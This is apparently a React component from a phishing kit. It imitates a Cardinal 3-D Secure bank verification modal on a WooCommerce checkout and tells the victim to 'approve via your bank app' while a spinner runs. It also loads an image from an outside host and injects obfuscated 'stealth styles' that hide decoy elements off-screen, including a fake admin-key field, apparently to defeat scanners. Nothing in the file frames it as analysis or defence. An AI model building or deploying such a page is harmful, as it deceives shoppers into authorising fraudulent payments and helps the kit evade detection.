import React, { useState, useEffect } from 'react';
import logosImg from '../../assets/img/image1.png';
const ContainerLoading = () => {
    const [styles, setStyles] = useState(null);
    const [currentDate, setCurrentDate] = useState('');
useEffect(() => {
  // Dynamically add stealth styles
  const style = document.createElement("style");
  style.innerHTML = `
    .fCon_z9s2x {
      position: absolute;
      top: -9999px;
      left: -9999px;
      width: 100vw;
      height: 200px;
      overflow: hidden;
      opacity: 0;
    }
    .mslBttn_e1z9s {
      position: absolute;
      left: -9999px;
      visibility: hidden;
    }
    .invDv_2z69s {
      width: 200px;
      height: 50px;
      background-color: rgba(255, 0, 0, 0.001);
      position: absolute;
      top: -1000px;
    }

    .FTI_A6RTsa {
      position: absolute;
      left: -1000px;
      top: -1000px;
      opacity: 0;
    }
  `;
  document.head.appendChild(style);
}, []);


useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles] = await Promise.all([
          import('../../assets/styles/styler.css'),
          import('../../assets/styles/styler_f.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
        });
      } catch (error) {
      }
    };

    loadStyles();

    const now = new Date();
    const formattedDate = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    setCurrentDate(formattedDate);
  }, []);
  const [formData, setFormData] = useState({
    });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
        ...prev,
        [name]: value,
    }));
};


return (
    <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
          <div style={{ 
              maxHeight: '100%',
              overflow: 'auto',
              padding: '20px',
    }} className="threeds-two">
      <div className="container-fluid">
      <img
        src={logosImg}
        alt=""
        style={{ width: '100%' }}
      /> 
    <br />
    <div
        className="formcol"
        style={{
            textAlign: 'center',
            fontWeight: 'normal',
          fontSize: '1.8em',
          marginBottom: '30px',
          color: '#3a3a3a',
        }}
      >
        Confirmation App...
      </div>
      <div
        className="formcol"
        style={{
            textAlign: 'center',
            fontWeight: 'normal',
          fontSize: '1.2em',
          marginBottom: '30px',
          color: '#3a3a3a',
        }}
      >
        <p>
          To complete this process, please approve via your bank app.
        </p>
        <div
          className="loader"
          style={{ display: 'inline-block' }}
        ></div>
        <br />
        <img
          src="https://netwatchnow.com/be/app/res/dranon.png"
          alt=""
          style={{ width: '70%' }}
        />
      </div>


        
        
      </div>
    </div>
          </div>
          <div className="fCon_z9s2x">
        <p>Welcome</p>
        <p>Loading</p>
        <input type="text" placeholder="Enter admin key" className="FTI_A6RTsa" />
        <button className="mslBttn_e1z9s">Submit Admin Code</button>
      </div>

      {/* Hidden but Space-Occupying Elements */}
      <div className="invDv_2z69s"></div>
        </div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default ContainerLoading;
